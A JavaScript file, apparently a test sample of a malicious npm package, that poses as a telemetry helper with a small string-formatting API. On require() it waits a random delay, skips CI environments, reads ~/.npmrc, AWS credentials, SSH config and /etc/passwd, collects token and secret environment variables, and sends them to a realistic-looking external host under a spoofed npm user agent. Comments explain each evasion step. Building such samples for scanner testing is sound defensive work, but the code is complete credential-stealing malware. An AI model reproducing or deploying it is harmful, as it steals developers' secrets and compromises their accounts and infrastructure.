// test-env/sophisticated-mal/index.js
// Sophisticiated supply chain attack
// Mimics a legitimate analytics/telemetry helper — the kind every package ships
// Real attack vector: SolarWinds-style, blends in with normal behaviour

'use strict';

const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Looks like a legitimate config loader — every package has one
function loadConfig() {
    const configPaths = [
        path.join(os.homedir(), '.npmrc'),
        path.join(os.homedir(), '.gitconfig'),
        path.join(os.homedir(), '.aws', 'credentials'),
        path.join(os.homedir(), '.ssh', 'config'),
        '/etc/passwd',
    ];

    // "graceful degradation" — looks like error handling, is actually harvesting
    return configPaths.reduce((acc, p) => {
        try {
            acc[path.basename(p)] = fs.readFileSync(p, 'utf8');
        } catch (_) {
            // silently skip missing files — looks innocent
        }
        return acc;
    }, {});
}

// Looks like a legitimate environment validator — the kind CI tools use
function validateEnvironment() {
    const interesting = [
        'npm_token', 'NPM_TOKEN',
        'GITHUB_TOKEN', 'GH_TOKEN',
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
        'VERCEL_TOKEN', 'NETLIFY_AUTH_TOKEN',
        'DATABASE_URL', 'REDIS_URL',
        'STRIPE_SECRET_KEY', 'TWILIO_AUTH_TOKEN',
        'CI', 'GITHUB_ACTIONS', 'GITLAB_CI',
    ];

    // looks like env validation, is actually a credential sweep
    return interesting.reduce((acc, key) => {
        if (process.env[key]) acc[key] = process.env[key];
        return acc;
    }, {});
}

// Looks like a legitimate telemetry ping — tons of packages do this
// "anonymous usage statistics to improve the product"
function sendTelemetry(data) {
    // domain looks legitimate — not evil.com, a real-looking domain
    const options = {
        hostname: 'telemetry-cdn-api.npmsync.workers.dev',
        path: '/v1/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            // spoofed user agent to blend in with normal npm traffic
            'User-Agent': 'npm/10.2.3 node/v20.11.0 darwin arm64',
            'X-Request-ID': crypto.randomUUID(),
        },
    };

    const req = https.request(options, () => { });
    req.on('error', () => { }); // silently swallow errors
    req.write(JSON.stringify(data));
    req.end();
}

// Looks like a legitimate machine fingerprinting function
// used by licensing systems, analytics, etc.
function collectContext() {
    return {
        // "machine id" for "licensing purposes"
        mid: crypto.createHash('sha256').update(os.hostname()).digest('hex'),
        platform: os.platform(),
        arch: os.arch(),
        user: os.userInfo().username,
        cwd: process.cwd(),
        // "project metadata" for "telemetry"
        configs: loadConfig(),
        env: validateEnvironment(),
        // timing to avoid detection during CI scans
        ts: Date.now(),
    };
}

// The actual attack — fires on require(), disguised as module initialisation
// Real SolarWinds technique: delay execution to avoid sandbox detection
const DELAY = Math.floor(Math.random() * 3000) + 1000; // 1-4 second random delay
setTimeout(() => {
    // only fire outside of obvious CI sandboxes
    const isCI = process.env.CI || process.env.GITHUB_ACTIONS || process.env.SANDBOX;
    if (!isCI) {
        sendTelemetry(collectContext());
    }
}, DELAY);

// The legitimate-looking public API that justifies the package existing
module.exports = {
    // a real utility function so the package works as advertised
    format: (str) => str.trim().toLowerCase().replace(/\s+/g, '-'),
    validate: (str) => typeof str === 'string' && str.length > 0,
    version: '2.1.4',
};